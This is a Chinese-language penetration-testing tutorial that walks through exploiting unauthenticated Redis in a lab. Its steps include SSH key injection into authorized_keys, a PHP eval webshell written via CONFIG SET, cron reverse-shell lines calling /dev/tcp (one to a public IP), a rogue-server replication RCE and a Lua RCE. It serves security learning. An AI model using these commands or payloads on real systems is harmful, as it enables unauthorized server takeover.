---
title: Redis未授权漏洞
date: 2023-09-03T15:29:52+08:00
updated: 2023-06-09T22:35:14+08:00
categories: 
- 渗透测试
- 外网漏洞
---

原理

漏洞利用

```
攻击机
kali  192.168.121.135
目标机
ubuntu 192.168.121.138
```

## redis常用命令

```
  set testkey "Hello World"         # 设置键testkey的值为字符串Hello World
  get testkey                       # 获取键testkey的内容
  SET score 99                      # 设置键score的值为99
  INCR score                        # 使用INCR命令将score的值增加1
  GET score                         # 获取键score的内容
  keys *                            # 列出当前数据库中所有的键
  get anotherkey                    # 获取一个不存在的键的值
  config set dir /home/test         # 设置工作目录
  config set dbfilename redis.rdb   # 设置备份文件名
  config get dir                    # 检查工作目录是否设置成功
  config get dbfilename             # 检查备份文件名是否设置成功
  save                              # 进行一次备份操作
  flushall 删除所有数据
  del key 删除键为key的数据
```

## 漏洞复现

nmap扫描目标机端口，发现开放6379端口，服务为redis

尝试直接连接

```
攻击机:
redis-cli -h 192.168.121.138
192.168.121.138:6379> info
# Server
redis_version:3.2.11
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:674c1c5898a9d86b
redis_mode:standalone
os:Linux 5.19.0-32-generic x86_64
#可直接无验证登录,存在未授权访问漏洞
```

### 公私钥认证

安装ssh服务

```
靶机执行
sudo mkdir /root/.ssh
```

```
攻击机执行
ssh-keygen -t rsa 
密码全部置为空
进入.ssh/目录，将生成的公钥保存到pub_key.txt中
(echo -e "\n\n";cat id_rsa.pub;echo -e "\n\n")>pub_key.txt
#将生成的公钥写进目标redis
cat /root/.ssh/pub_key.txt | redis-cli -h 192.168.121.138 -x set pub_key
OK
#将redis默认备份路径改为/root/.ssh/ -- 可通过CONFIG GET dir 查看当前路径
CONFIG SET dir /root/.ssh/
#设置备份公钥为authorized_keys
CONFIG SET dbfilename authorized_keys
#写入完成，尝试ssh连接
ssh 192.168.121.138 
#若报错“ssh: connect to host 192.168.121.138 port 22: Connection refused”
#说明目标没有shh服务
```

### 绝对路径写shell

```
#目标要存在web服务，且知道根目录路径
攻击机执行
#如果没有目录，创建即可
config set dir /var/www/html 
config set dbfilename redis.php  #把默认备份文件改为redis.php，为了后面写码
192.168.121.138:6379> set shell "<?php @eval($_POST['1']);?>"
save
然后访问redis.php即可传参执行命令，可继续提权
```

### 反弹shell

cron  --linux下的定时执行任务

详细介绍:https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html

```
/var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名
/etc/crontab 这个文件负责调度各种管理和维护任务。
ubuntu中root默认路径/var/spool/cron/crontabs/root
```

```
config set dbfilename root
config set dir /var/spool/cron
SET xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.121.135/7777 0>&1\n\n"
set x "\n* * * * * bash -i >& dev/tcp/43.136.236.40/7777 0>&1\n"   -->* * * * *代表每分钟执行一次命令
save
```

### 主从复制rce

redis4.x新增模块功能，redis模块可以使用外部模块扩展redis,从而实现一个新的redis命令，通过写C语言编写出.so文件，redis模块为动态库，在启动或是MODEL LOAD时会将文件加载到库中，从而达到注入恶意.so文件的目的

原理:通过模拟恶意主机作为主节点，在目标机上设置主从复制，然后模拟`FULLRESYNC`执行全量复制操作，将恶意主机上的恶意so文件同步到目标主机并加载以执行系统恶意命令。

```
使用https://github.com/n0b0dyCN/redis-rogue-server工具，即可直接连接目标机获得shell
```

```
└─# ./redis-rogue-server.py --rhost 127.0.0.1  --lhost 127.0.0.1 --lport 8888
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 127.0.0.1:6379
[info] SERVER 127.0.0.1:8888
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: i
[info] Interact mode start, enter "exit" to quit.

```

### Lua RCE

漏洞原理：FORLOOP操作码未验证数据类型导致读取内存指针；UpVal处理时的内存破坏

lua漏洞的详细介绍：https://gist.github.com/corsix/6575486

环境搭建

```
centos6.5 + redis-2.6.16
```

下载可利用脚本，修改目标地址host

https://github.com/QAX-A-Team/redis_lua_exploit/

执行后redis-cli连接目标redis执行

```
eval "tonumber('id', 8)" 0
```

即可执行id命令，若要更改命令，在id处修改即可，也可反弹shell

关于该漏洞的挖掘和分析

https://www.anquanke.com/post/id/151203

### 反序列化

我们理解到的redis是一种小型数据库，在现实环境中redis可能会被用来存储序列化后的数据

利用思路就是将篡改好的恶意序列化数据添加到redis中，当该数据再次取出反序列化时除法反序列化漏洞

jackon反序列化

```
观察json对象是不是数组，第一个元素像不像类名
["com.blue.bean.User",xxx]
```

fastjson:关注有没有@type字段

jdk:观察value是不是base64,如果是解码后看里面有没有java包名

漏洞的具体利用流程：

https://paper.seebug.org/1169/#_3

参考链接：

https://xz.aliyun.com/t/5665#toc-8

https://www.anquanke.com/post/id/151203#h3-3

https://www.mad-coding.cn/2020/01/16/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#1-2-1-%E5%AE%89%E8%A3%85redis
